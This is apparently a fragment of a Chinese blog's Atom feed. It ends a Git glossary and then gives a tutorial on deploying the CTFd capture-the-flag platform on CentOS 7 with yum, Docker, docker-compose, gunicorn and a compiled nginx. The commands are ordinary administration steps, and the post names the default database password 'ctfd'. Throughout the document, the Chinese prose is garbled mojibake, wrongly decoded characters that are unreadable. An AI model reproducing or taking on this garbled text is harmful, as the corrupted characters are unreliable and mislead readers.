åˆ°åœ¨çº¿Githubã€‚</li><li>Pullingï¼ˆæ‹‰å–ï¼‰ï¼šä»åœ¨çº¿çš„Githubä¸Šè·å–æœ€æ–°çš„æäº¤è®°å½•ï¼Œç„¶ååˆå¹¶åˆ°æœ¬åœ°ç”µè„‘ä¸Šã€‚</li><li>Master (branch)ï¼šä¸»åˆ†æ”¯ï¼Œæäº¤å†å² â€œæ ‘â€çš„ â€œæ ‘å¹²â€ï¼ŒåŒ…å«æ‰€æœ‰å·²å®¡æ ¸çš„å†…å®¹/ä»£ç ã€‚</li><li>Feature branchï¼ˆåŠŸèƒ½åˆ†æ”¯/ç‰¹æ€§åˆ†æ”¯ï¼‰ï¼šä¸€ä¸ªåŸºäºä¸»åˆ†æ”¯çš„ç‹¬ç«‹çš„ä½ç½®ï¼Œåœ¨å†æ¬¡å¹¶å…¥åˆ°ä¸»åˆ†æ”¯ä¹‹å‰ï¼Œä½ å¯ä»¥åœ¨è¿™é‡Œå®‰å…¨åœ°å†™å·¥ä½œä¸­çš„æ–°ä»»åŠ¡ã€‚</li><li>Pull Requestï¼ˆå‘å¸ƒè¯·æ±‚ï¼‰ï¼šä¸€ä¸ª Github å·¥å…·ï¼Œå…è®¸ç”¨æˆ·è½»æ¾åœ°æŸ¥çœ‹æŸåŠŸèƒ½åˆ†æ”¯çš„æ›´æ”¹ ï¼ˆthe differenceæˆ– â€œdiffâ€ï¼‰ï¼ŒåŒæ—¶å…è®¸ç”¨æˆ·åœ¨è¯¥åˆ†æ”¯åˆå¹¶åˆ°ä¸»åˆ†æ”¯ä¹‹å‰å¯¹å…¶è¿›è¡Œè®¨è®ºå’Œè°ƒæ•´ã€‚</li><li>Mergingï¼ˆåˆå¹¶ï¼‰ï¼šè¯¥æ“ä½œæŒ‡è·å–åŠŸèƒ½åˆ†æ”¯çš„æäº¤ï¼ŒåŠ å…¥åˆ°ä¸»åˆ†æ”¯æäº¤å†å²çš„é¡¶éƒ¨ã€‚</li><li>Checking outï¼ˆåˆ‡æ¢ï¼‰ï¼šè¯¥æ“ä½œæŒ‡ä»ä¸€ä¸ªåˆ†æ”¯åˆ‡æ¢åˆ°å¦ä¸€ä¸ªåˆ†æ”¯ã€‚</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;ä½œä¸ºä¸€ä¸ªç™½å¸½å­ï¼Œä½¿ç”¨githubçš„å”¯ä¸€ç›®çš„æ˜¯è®°å½•è‡ªå·±çš„ç ”ç©¶é¡¹ç›®ï¼Œå­˜æ”¾å­¦ä¹ ç¬”è®°ï¼Œå¤‡ä»½èµ„æ–™ç­‰ç­‰ã€‚å¯¹ååŒå¼€å‘çš„éœ€æ±‚ä¸å¤§ï¼Œç®€å•ä½¿ç”¨Gitçš„å‡ ä¸ªå‘½ä»¤å°±å¯ä»¥ä¸Šä¼ æœ¬åœ°æ–‡ä»¶åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œå¾ˆå¤šäººè¯´å¾ˆç¹çï¼Œå–œæ¬¢ä½¿ç”¨GUIç‰ˆæœ¬çš„github for Desktop,é‚£ä¹ˆè¿™å°±çœ‹ä¸ªäººå–œå¥½äº†~æ¥ä¸‹æ¥çš„å†…å®¹ä»…é€‚åˆåŒæˆ‘æƒ…å†µå·®ä¸å¤šçš„äººé˜…è¯»! &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;è¯¦ç»†çš„å­¦ä¹ æ•™ç¨‹â€“&amp;gt;&lt;a href=&quot;http://www.runoob.com/git/git-tutorial.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;èœé¸Ÿæ•™ç¨‹ for Git&lt;/a&gt; &lt;/p&gt;
    
    </summary>
    
      <category term="éšç¬”" scheme="http://qymua.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
      <category term="github" scheme="http://qymua.com/categories/%E9%9A%8F%E7%AC%94/github/"/>
    
    
      <category term="Git" scheme="http://qymua.com/tags/Git/"/>
    
      <category term="github" scheme="http://qymua.com/tags/github/"/>
    
  </entry>
  
  <entry>
    <title>CTFdæ­å»ºç¬”è®°</title>
    <link href="http://qymua.com/2019/04/15/CTFd%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/"/>
    <id>http://qymua.com/2019/04/15/CTFdæ­å»ºç¬”è®°/</id>
    <published>2019-04-14T18:16:49.000Z</published>
    <updated>2019-08-27T13:58:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>å…¶å®è¿˜æœ‰å¾ˆå¤šå…¶ä»–å¼€æºçš„CTFå¹³å°ï¼Œä¹‹æ‰€ä»¥é€‰æ‹©CTFdä¸»è¦è€ƒè™‘åˆ°ç®€ä¾¿ï¼Œæˆæœ¬ä½ï¼ŒDIYå‡ ä¸ªç‰¹æ€§ï¼ŒFBCTFä¹Ÿæ˜¯ä¸ªå¾ˆæ£’çš„æ¯”èµ›å¹³å°ï¼Œç•Œé¢å¾ˆç‚«é…·ï¼Œä½†æ˜¯èµ„æºå ç”¨æ¯”è¾ƒå¤§ï¼Œå¦å¤–å› ä¸ºè¢«å¼ºï¼Œéƒ¨ç½²éš¾åº¦è¾ƒéº»çƒ¦ï¼Œäº²æµ‹åå†³å®šæ”¾å¼ƒã€‚miniCTFåŠŸèƒ½ä¸èƒ½æ»¡è¶³éœ€æ±‚ã€‚è‡³äºæƒ³æ·±å…¥äº†è§£å»CTFdå®˜ç½‘å·§å·§å§ï¼</p><a id="more"></a><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>CTFdæ˜¯ä¸€æ¬¾åŸºäºApache2.0çš„åè®®çš„å¼€æºCTFå¹³å°ï¼Œæœ€æ–°ç‰ˆæœ¬ç›®å‰ä¸º2.1.2ã€‚è¯¥å¹³å°åŠŸèƒ½å¼ºå¤§ï¼ŒåŸºæœ¬ä¸Šèƒ½å¤Ÿæ»¡è¶³ç›®å‰çš„CTFç«èµ›éœ€æ±‚ï¼ŒåŒæ—¶ï¼Œè¯¥å¹³å°æä¾›äº†å¼ºå¤§çš„æ’ä»¶åŠŸèƒ½ï¼Œå¯ä»¥è‡ªå·±è¿›è¡Œæ’ä»¶å¼€å‘å®ç°è‡ªå·±çš„åŠŸèƒ½ã€‚</p><h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><blockquote><p>æœ¬æ¬¡å¹³å°çš„æ­å»ºç¤ºä¾‹æ˜¯åœ¨æœ¬åœ°è™šæ‹Ÿæœºcentos 7ä¸‹å®Œæˆçš„ï¼Œè¯·ä¿è¯ç³»ç»Ÿç¯å¢ƒæ­£å¸¸ã€‚<strong>å¦‚æœéœ€è¦éƒ¨ç½²åœ¨äº‘æœåŠ¡å™¨ä¸Šï¼Œè¯·å‡†å¤‡å¥½sshå·¥å…·(æ¨èxshell)é“ç†å¤§ä½“ç›¸åŒï¼Œåªæ˜¯æœ€åä¸ºäº†è®©è®¿é—®æ›´æµç•…å»ºè®®åšä¸‹ä¼˜åŒ–ï¼Œæ–‡ç« æœ«å°¾ä¼šåšè¯´æ˜ï¼</strong></p></blockquote><h2 id="å‰æœŸå‡†å¤‡"><a href="#å‰æœŸå‡†å¤‡" class="headerlink" title="å‰æœŸå‡†å¤‡"></a>å‰æœŸå‡†å¤‡</h2><h3 id="0-ç³»ç»Ÿç¯å¢ƒ"><a href="#0-ç³»ç»Ÿç¯å¢ƒ" class="headerlink" title="0.ç³»ç»Ÿç¯å¢ƒ"></a>0.ç³»ç»Ÿç¯å¢ƒ</h3><p>è™šæ‹Ÿæœºçš„è¯æœ€å¥½ä½¿ç”¨æ¡¥æ¥ï¼Œæå‰æ’é™¤è¿™ä¸ªå‡ºé”™çš„å¯èƒ½æ€§ï¼Œäº‘æœåŠ¡å™¨å¯ä»¥å¿½ç•¥è¿™ä¸€ç‚¹<br>å®‰åˆ©ä¸€æ³¢ç³»ç»Ÿä¸‹è½½åœ°å€ï¼Œæ¨èä½¿ç”¨å›½å†…é•œåƒç«™ä¸‹è½½ï¼š</p><p><a href="https://mirrors.tuna.tsinghua.edu.cn/#" target="_blank" rel="noopener">æ¸…åå¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™</a></p><p>ä¸ºäº†ç¤ºä¾‹æˆ‘é€‰æ‹©miniç‰ˆæœ¬</p><h3 id="1-æ£€æŸ¥ç½‘ç»œç¯å¢ƒ"><a href="#1-æ£€æŸ¥ç½‘ç»œç¯å¢ƒ" class="headerlink" title="1.æ£€æŸ¥ç½‘ç»œç¯å¢ƒ"></a>1.æ£€æŸ¥ç½‘ç»œç¯å¢ƒ</h3><p>å®‰è£…æˆåŠŸåå»ºè®®æµ‹è¯•ä¸‹ç½‘ç»œï¼Œ<code>ip addr</code>æ²¡æœ‰æ­£å¸¸è·å–åœ°å€çš„è¯ï¼Œå°è¯•é‡å¯ç½‘ç»œæœåŠ¡<code>systemctl restart network</code></p><p>æ—¥å¸¸redhatç³»ç”¨çš„å°‘ï¼Œå‘½ä»¤å˜ç”Ÿç–äº†ï¼ˆç‹—å¤´ï¼‰</p><h3 id="2-ç»ˆç«¯è¿æ¥"><a href="#2-ç»ˆç«¯è¿æ¥" class="headerlink" title="2.ç»ˆç«¯è¿æ¥"></a>2.ç»ˆç«¯è¿æ¥</h3><p>å…¶å®ï¼Œ<em>CentOS</em> 7å®‰è£…å®Œæˆï¼Œ<em>é»˜è®¤</em>æ˜¯å·²ç»æ‰“å¼€äº†22ç«¯å£çš„ã€‚è‡ªå¸¦çš„<em>SSH</em>æœåŠ¡æ˜¯<em>OpenSSH</em>ä¸­çš„ä¸€ä¸ªç‹¬ç«‹å®ˆæŠ¤è¿›ç¨‹<em>SSHD</em> </p><p>æ‰€ä»¥å¯ä»¥ç›´æ¥è¿æ¥ï¼Œå¾ˆæ–¹ä¾¿ï¼Œå¦‚æœé‡åˆ°é”™è¯¯å¯ä»¥æŸ¥é˜…ç›¸å…³æ–‡æ¡£</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566909041449.png" alt></p><h3 id="3-yumæ¢æº"><a href="#3-yumæ¢æº" class="headerlink" title="3.yumæ¢æº"></a>3.yumæ¢æº</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/yum<span class="selector-class">.repos</span><span class="selector-class">.d</span>/CentOS-Base<span class="selector-class">.repo</span> /etc/yum<span class="selector-class">.repos</span><span class="selector-class">.d</span>/CentOS-Base<span class="selector-class">.repo</span><span class="selector-class">.backup</span> </span><br><span class="line">wget -O /etc/yum<span class="selector-class">.repos</span><span class="selector-class">.d</span>/CentOS-Base<span class="selector-class">.repo</span> http:<span class="comment">//mirrors.aliyun.com/repo/Centos-7.repo </span></span><br><span class="line">wget -O /etc/yum<span class="selector-class">.repos</span><span class="selector-class">.d</span>/epel<span class="selector-class">.repo</span> http:<span class="comment">//mirrors.aliyun.com/repo/epel-7.repo</span></span><br><span class="line">yum clean all   </span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure><h3 id="4-å®‰è£…git"><a href="#4-å®‰è£…git" class="headerlink" title="4.å®‰è£…git"></a>4.å®‰è£…git</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> git</span><br></pre></td></tr></table></figure><h3 id="5-å®‰è£…pip"><a href="#5-å®‰è£…pip" class="headerlink" title="5.å®‰è£…pip"></a>5.å®‰è£…pip</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> python-pip</span><br><span class="line">pip <span class="keyword">install</span> <span class="comment">--upgrade pip</span></span><br></pre></td></tr></table></figure><p>pipæ¢æº</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.pip</span><br><span class="line">echo -e "[global]\nindex-url = <span class="link">https://pypi.douban.com/simple/\n</span>[<span class="string">install</span>]\ntrusted-host = pypi.douban.com" &gt;  ~/.pip/pip.conf</span><br></pre></td></tr></table></figure><h3 id="6-å®‰è£…Docker"><a href="#6-å®‰è£…Docker" class="headerlink" title="6.å®‰è£…Docker"></a>6.å®‰è£…Docker</h3><p>å®‰è£…éœ€è¦çš„è½¯ä»¶åŒ…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2 bind-utils</span><br></pre></td></tr></table></figure><p>è®¾ç½®yumæº</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>å®‰è£…docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install docker-ce</span><br></pre></td></tr></table></figure><p>å¯åŠ¨å¹¶åŠ å…¥å¼€æœºå¯åŠ¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure><p>éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566911917029.png" alt></p><h3 id="7-å®‰è£…docker-compose"><a href="#7-å®‰è£…docker-compose" class="headerlink" title="7.å®‰è£…docker-compose"></a>7.å®‰è£…docker-compose</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install epel-release </span><br><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥docker-composeæ˜¯å¦æˆåŠŸå®‰è£…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -version</span><br></pre></td></tr></table></figure><h2 id="éƒ¨ç½²é˜¶æ®µ"><a href="#éƒ¨ç½²é˜¶æ®µ" class="headerlink" title="éƒ¨ç½²é˜¶æ®µ"></a>éƒ¨ç½²é˜¶æ®µ</h2><h3 id="1-ä¸‹è½½CTFd"><a href="#1-ä¸‹è½½CTFd" class="headerlink" title="1.ä¸‹è½½CTFd"></a>1.ä¸‹è½½CTFd</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/CTFd/CTFd.git</span><br><span class="line">chmod -R <span class="number">755</span> CTFd/</span><br></pre></td></tr></table></figure><blockquote><p>vimä½¿ç”¨ç§‘æ™®â€“&gt;å‘½ä»¤æ¨¡å¼ä¸‹è¾“å…¥/åå¯ä»¥å®ç°ç±»ä¼¼Ctrl+Fçš„åŠŸèƒ½æœç´¢æ–‡æœ¬å†…å®¹ï¼ŒæŒ‰næŸ¥æ‰¾ä¸‹ä¸€æ¡ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨æœ¬åœ°git cloneä¸‹è½½CTFdæ–‡ä»¶å…ˆä¿®æ”¹åä¸Šä¼ </p></blockquote><p>æµè§ˆCTFdç›®å½•ç»“æ„ï¼Œä¸»è¦å…³æ³¨çš„æ˜¯<code>Themes</code>ï¼Œä¹‹åå¯ä»¥DIYä¸»é¢˜ï¼Œå¦‚è¦ä¸Šä¼ åœ¨æœ¬åœ°ä¿®æ”¹å¥½çš„ä¸»é¢˜æ–‡ä»¶</p><p>xshellç»ˆç«¯æ¨èä½¿ç”¨<code>lrzsz</code>ï¼Œ<code>sz file</code>ï¼šä¸‹è½½ï¼›<code>rz</code>ï¼šä¸Šä¼ </p><p>ä»¥åŠ<code>docker-compose.yml</code>ï¼Œå¯ä»¥å¯¹ä¿®æ”¹éƒ¨ç½²é…ç½®</p><h3 id="2-å®‰è£…CTFd"><a href="#2-å®‰è£…CTFd" class="headerlink" title="2.å®‰è£…CTFd"></a>2.å®‰è£…CTFd</h3><p>åœ¨CTFç»´åŸº<a href="https://github.com/CTFd/CTFd/wiki/Getting-Started" target="_blank" rel="noopener">https://github.com/CTFd/CTFd/wiki/Getting-Started</a> ä¸­å†™äº†è¯¦ç»†çš„å®‰è£…æ­¥éª¤ã€‚</p><p>ç®€æ˜“é‡‡ç”¨ç¬¬äºŒç§æ–¹å¼ï¼ˆdockerå®‰è£…ï¼‰</p><p><strong>å¸¸è§„æ–¹å¼</strong></p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd CTFd/</span><br><span class="line"><span class="meta"># å®‰è£…æ“ä½œç³»ç»Ÿéœ€è¦å®‰è£…çš„åŒ…</span></span><br><span class="line">./prepare.sh</span><br><span class="line"><span class="meta"># å®‰è£…pythonéœ€è¦çš„åŒ…</span></span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"><span class="meta"># è¿è¡ŒCTFd</span></span><br><span class="line">python serve.py</span><br></pre></td></tr></table></figure><blockquote><p>æ¥ä¸‹å»ä¼šä¸‹è½½å¾ˆå¤šä¸œè¥¿ï¼Œä¹Ÿå°±æ˜¯è·‘ä¸‹è„šæœ¬ä¸€é”®éƒ¨ç½²å¹³å°æ‰€éœ€è¦çš„ç¯å¢ƒï¼Œå¦‚æœå‡ºç°çº¢å­—æŠ¥é”™æˆ–è€…å„ç§ä¾èµ–é—®é¢˜ï¼Œå¯ä»¥å°è¯•updateæˆ–è€…soloä¸‹ï¼Œæ¯ä¸ªäººæƒ…å†µä¸ä¸€ï¼Œæ­¤ç±»é—®é¢˜è‡ªè¡Œè§£å†³</p></blockquote><p>å®Œæˆä»¥ä¸Šæ­¥éª¤åªæ˜¯åœ¨æœ¬åœ°æ­èµ·æœåŠ¡å™¨ï¼Œè¦æ˜¯æƒ³åœ¨å…¬ç½‘ï¼ˆç‰©ç†æœºï¼‰è®¿é—®ï¼Œè¿˜éœ€è¦å®‰è£…gunicorn<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip install gunicorn</span><br><span class="line">sudo (gunicorn --bind <span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>:<span class="number">8000</span> -w <span class="number">4</span> <span class="string">"CTFd:create_app()"</span>&amp;)</span><br><span class="line">// è¿™é‡ŒåŠ äº†()è¿˜æœ‰&amp;æ˜¯ä¸ºäº†é‚£èƒ½å¤Ÿåå°è¿è¡Œ  [<span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>]ä¸ç”¨ä¿®æ”¹</span><br><span class="line">//gunicornçš„å‘½ä»¤ä¸€å®šè¦è¿›CTFdç›®å½•è¾“å…¥</span><br><span class="line">//è®¿é—®è™šæ‹Ÿæœºï¼ˆæœåŠ¡å™¨ï¼‰å…¬ç½‘<span class="built_in">IP</span>å³å¯çœ‹è§å¹³å°</span><br></pre></td></tr></table></figure></p><p>å¦‚æœä½ æ˜¯åœ¨è™šæ‹Ÿæœºéƒ¨ç½²ï¼Œè¯·åˆ‡æ¢ä¸ºNATè¿æ¥ï¼Œåœ¨VMè™šæ‹Ÿç½‘è·¯ç¼–è¾‘å™¨ä¸Šï¼Œå°†è™šæ‹Ÿæœºçš„8000ç«¯å£æ˜ å°„åˆ°æœ¬æœºä¸Šï¼Œå³å¯å®ç°ç‰©ç†æœºè®¿é—®ï¼Œæ¡¥æ¥æ¨¡å¼å³å¯ç›´æ¥åœ¨å±€åŸŸç½‘å†…å…±äº«å¹³å°</p><p><strong>dockerå®‰è£…</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> CTFd/</span><br><span class="line">docker-compose up -<span class="built_in">d</span></span><br></pre></td></tr></table></figure><p>é™é™ç­‰å¾…å®‰è£…å®Œæˆ</p><p>âœ”æ¨èä½¿ç”¨dockeréƒ¨ç½²å¹³å°,æ— éœ€è‹¦æ¼ç¯å¢ƒé—®é¢˜,ç›´æ¥pullå®˜æ–¹æä¾›çš„ä¾èµ–ç¯å¢ƒ,æ­å»ºåçš„è®¿é—®é€Ÿåº¦æ˜æ˜¾æå‡~<br><br><strong>PSï¼šåœ¨äº‘æœåŠ¡å™¨æ­å»ºï¼Œè¯·å…ˆåœ¨å®‰å…¨ç»„é‡Œå¼€æ”¾8000ç«¯å£</strong></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g22qi1idssj31f40qfq54.jpg" alt></p><p>å¦‚æœå®‰è£…æˆåŠŸä¸èƒ½è®¿é—®ï¼Œçœ‹ä¸‹æ˜¯ä¸æ˜¯é˜²ç«å¢™æŠŠç«¯å£ç»™è¿‡æ»¤æ‰äº†ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd <span class="attribute">--zone</span>=public <span class="attribute">--add-port</span>=8000/tcp --permanent</span><br></pre></td></tr></table></figure><h3 id="æ•´ç«™é•œåƒä¸‹è½½ï¼ˆubuntuï¼‰"><a href="#æ•´ç«™é•œåƒä¸‹è½½ï¼ˆubuntuï¼‰" class="headerlink" title="æ•´ç«™é•œåƒä¸‹è½½ï¼ˆubuntuï¼‰"></a>æ•´ç«™é•œåƒä¸‹è½½ï¼ˆubuntuï¼‰</h3><blockquote><p>å¦‚æœä½ æœ€ç»ˆæ— æ³•æˆåŠŸéƒ¨ç½²ï¼Œåªæ˜¯æƒ³åœ¨æœ¬åœ°å±€åŸŸç½‘å†…ä½¿ç”¨ï¼Œå¯ä»¥å°è¯•ä¸‹è½½åšä¸»æ­å»ºå¥½çš„è™šæ‹Ÿæœºé•œåƒç©ä¸€ç©ï¼Œ<strong><em>ä½¿ç”¨å‰æ³¨æ„é‡å¯è™šæ‹Ÿæœºï¼Œå› ä¸ºå¿«ç…§æ˜¯å¼€æœºçŠ¶æ€ï¼ŒNATåœ°å€æ®µå¯èƒ½ä¸ä¸€æ ·ï¼Œéœ€è¦é‡æ–°è·å–</em></strong><br>å‹ç¼©åŒ…å¯†ç ï¼š<code>qymua.com</code>ï¼ˆå¹³å°æœªè¿›è¡Œä»»ä½•é…ç½®å’Œä¼˜åŒ–ï¼‰<br>å‹ç¼©åŒ…å¤§å°ï¼š<strong>3.01G</strong><br>è§£å‹åå¤§å°ï¼š<strong>13G</strong><br>å‹ç¼©åŒ…MD5ï¼š<code>ef601c06af91f4c7532cbeaac7b324f0</code></p></blockquote><p><a id="download" href="https://pan.baidu.com/s/1IEQ5xo7BhZmG5jvx993fnA" target="_blank" rel="noopener"><i class="fa fa-download"></i><span> Download Now</span> </a></p><p><code>å¯†ç :da8m</code></p><p><strong>æ³¨</strong> ï¼šæ–‡ç« å·²æ›´æ–°ï¼Œè¿™æ˜¯å¾ˆæ—©ä»¥å‰çš„ï¼Œæˆ‘ä¹Ÿæ‡’å¾—åˆ äº†XD</p><h2 id="è¿ç»´ä¸ä¼˜åŒ–"><a href="#è¿ç»´ä¸ä¼˜åŒ–" class="headerlink" title="è¿ç»´ä¸ä¼˜åŒ–"></a>è¿ç»´ä¸ä¼˜åŒ–</h2><p>CTFdçš„æ•°æ®åº“ç”¨çš„æ˜¯mariadbï¼Œçœ‹ä¸€ä¸‹dockerè¿è¡Œäº†å“ªäº›å®¹å™¨</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566913239238.png" alt></p><p>å¯ä»¥çœ‹åˆ°è¿è¡Œäº†ä¸‰ä¸ªå®¹å™¨ï¼Œåˆ†åˆ«æ˜¯ctfdï¼Œmariadbï¼Œredisã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥è¿›å…¥åˆ°å„ä¸ªå®¹å™¨è¿›è¡Œæ“ä½œã€‚</p><p>docker exec -it [CONTAINER ID] /bin/bash</p><p>æ•°æ®åº“rootè´¦æˆ·çš„å¯†ç é»˜è®¤ä¸ºctfd</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566913369429.png" alt></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566913467065.png" alt></p><h3 id="é…ç½®Nginx"><a href="#é…ç½®Nginx" class="headerlink" title="é…ç½®Nginx"></a>é…ç½®Nginx</h3><p>å¦‚æœæœ‰éœ€è¦çš„è¯ä¹Ÿå¯ä»¥é…ç½®ä¸€ä¸‹nginxï¼Œè¿™æ ·è®¿é—®é€Ÿåº¦ä¼šå˜å¿«ï¼Œè€Œä¸”ä½œä¸ºä¸€ä¸ªä¸­é—´ä»¶æ›´æ”¹ç«¯å£ä¼šæ›´æ–¹ä¾¿(å½“ç„¶å°ä¼™ä¼´ä»¬é€‰æ‹©Apacheä¹Ÿæ˜¯å¯ä»¥çš„)ã€‚ å‚è€ƒé“¾æ¥</p><p><strong>ç¡®ä¿æ‰€éœ€ç¯å¢ƒå·²å®‰è£…</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> gcc-c++</span><br><span class="line">yum <span class="keyword">install</span> -y pcre pcre-devel</span><br><span class="line">yum <span class="keyword">install</span> -y zlib zlib-devel</span><br><span class="line">yum <span class="keyword">install</span> -y openssl openssl-devel</span><br></pre></td></tr></table></figure><p>æ ¹ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹nginx</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir <span class="string">/nginx</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/nginx</span></span><br><span class="line">wget https:<span class="string">//nginx.org/download/nginx-1.14.2.tar.gz</span></span><br><span class="line">tar -zxvf nginx-1.14.2.tar.gz</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›å…¥åˆ°ç›®å½•ä¸‹è¿›è¡Œç¼–è¯‘</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line"><span class="keyword">make</span></span><br><span class="line"><span class="keyword">make</span> install</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾ä¸€ä¸‹nginxçš„ä½ç½® whereis nginx</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566913645892.png" alt></p><p>nginxå¸¸è§å‘½ä»¤</p><p>å¯åŠ¨ã€åœæ­¢nginx</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/usr/local/nginx/sbin/</span></span><br><span class="line"><span class="string">./nginx</span></span><br><span class="line"><span class="string">./nginx</span> -s stop</span><br><span class="line"><span class="string">./nginx</span> -s <span class="keyword">quit</span></span><br><span class="line"><span class="string">./nginx</span> -s <span class="keyword">reload</span></span><br><span class="line"><span class="string">./nginx</span> -s <span class="keyword">quit</span>:æ­¤æ–¹å¼åœæ­¢æ­¥éª¤æ˜¯å¾…nginxè¿›ç¨‹å¤„ç†ä»»åŠ¡å®Œæ¯•è¿›è¡Œåœæ­¢ã€‚</span><br><span class="line"><span class="string">./nginx</span> -s stop:æ­¤æ–¹å¼ç›¸å½“äºå…ˆæŸ¥å‡ºnginxè¿›ç¨‹idå†ä½¿ç”¨killå‘½ä»¤å¼ºåˆ¶æ€æ‰è¿›ç¨‹ã€‚</span><br></pre></td></tr></table></figure><p>nginxå¼€æœºè‡ªå¯åŠ¨<br>å³åœ¨<code>rc.local</code>å¢åŠ å¯åŠ¨ä»£ç å°±å¯ä»¥äº†ã€‚ <code>vi /etc/rc.local</code></p><p>å¢åŠ ä¸€è¡Œ <code>/usr/local/nginx/sbin/nginx</code> (æ ¹æ®whereis nginxå®é™…çš„ä½ç½®ä¸ºå‡†)</p><p>è®¾ç½®æ‰§è¡Œæƒé™ï¼š<code>chmod 755 rc.local</code></p><p>é…ç½®nginx é…ç½®ä¹‹å‰éœ€è¦å…ˆè¿è¡Œä¸€ä¸‹nginx</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./nginx</span></span><br><span class="line"><span class="string">./nginx</span> -s <span 